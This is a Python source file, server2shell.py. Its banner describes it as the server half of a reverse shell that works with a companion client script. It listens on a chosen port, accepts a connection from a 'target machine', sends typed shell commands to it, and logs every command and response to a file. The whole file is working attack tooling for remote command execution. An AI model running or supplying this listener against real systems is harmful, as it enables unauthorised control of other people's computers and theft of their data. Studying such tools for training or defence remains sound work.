import socket
import sys
import os

# Banner
def banner():
	os.system('cls')
	print(" __                         ____  __ _          _ _ ")
	print("/ _\ ___ _ ____   _____ _ _|___ \/ _\ |__   ___| | |")
	print("\ \ / _ \ '__\ \ / / _ \ '__|__) \ \| '_ \ / _ \ | |")
	print("_\ \  __/ |   \ V /  __/ |  / __/_\ \ | | |  __/ | |")
	print("\__/\___|_|    \_/ \___|_| |_____\__/_| |_|\___|_|_|\n")
	print ("+--------------------------------------------------------------------------------------------+")
	print ("| Author: glyph                                                                              |")
	print ("| Title: server2shell.py                                                                     |") 
	print ("| Creation Date: 19/02/2019                                                                  |")
	print ("| Version Control: 1.0					                                                     |") 
	print ("| Description: Couples with Client2Shell.py to produce a reverse shell using Native Python.  |")
	print ("| Usage: " + sys.argv[0][-15:] + " -t <bind address> -p <bind port> 						 |")
	print ("+--------------------------------------------------------------------------------------------+")

# Setting Usage Function
def usage ():
	print ("Usage: " + str(sys.argv[0][-15:]) + " -t <bind address> -p <bind port>")

# Create socket (allows two computers to connect)
def socket_create(HOST, PORT):
	try:
		global s
		s = socket.socket()
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Mitigates against Address reuse problem
	except socket.error as msg:
		print ("Socket creation error: " + str(msg))


# Bind socket to port and wait for connection from the client
def socket_bind(HOST, PORT):
	try:
		global s
		print ("Binding socket to port: " + str(PORT))
		s.bind((HOST, PORT))
		s.listen(5)
	except socket.error as msg:
		print ("Socket binding error: " + str(msg) + "\n" + "Retrying...")
		socket.bind()

# Establish a connection with client (socket must be listening for them)
def socket_accept():
	conn, address = s.accept() # socket.accept() returns a socket object (conn) and a tuple containing addressinfo i.e. IP and Port. For example: ('10.118.26.174', 1990)
	print ("[+] Connection from:\n[+] IP Address: " + address[0] + "\n[+] Port: " + str(address[1]) + "\n[+] Type \'quit\' to exit.\n[+] Enter commands:")
	send_commands(conn)
	conn.close()

# Logging all comms
def write_log(command, client_response):
	try:
		with open ('log.txt' , 'a') as f:
			f.write(command + "\n" + client_response)
		f.close()
	except IOError as msg:
		print ("Error writing to log: " + str(msg))

# Sending commands to target machine
def send_commands(conn):
	while True:
		command = raw_input()
		if command == 'quit':
			conn.close()
			s.close()
			sys.exit()
		if len(command) > 0:
			conn.send(command)
			client_response = conn.recv(65535)
			print (client_response),
			write_log(command, client_response)

def main(argv):
	banner()
 	try:
		if (argv[0] == '-t' and argv[1] and argv[2] == '-p' and argv[3]):
	 		HOST = str(argv[1])
	 		PORT = int(argv[3])
	 		socket_create(HOST, PORT)
	 		socket_bind(HOST, PORT)
	 		socket_accept()
	 	else:
			usage()
	except IndexError:
		usage()
	except ValueError:
		usage()
	else:
		sys.exit()
	
if __name__ == '__main__':
	main(sys.argv[1:])
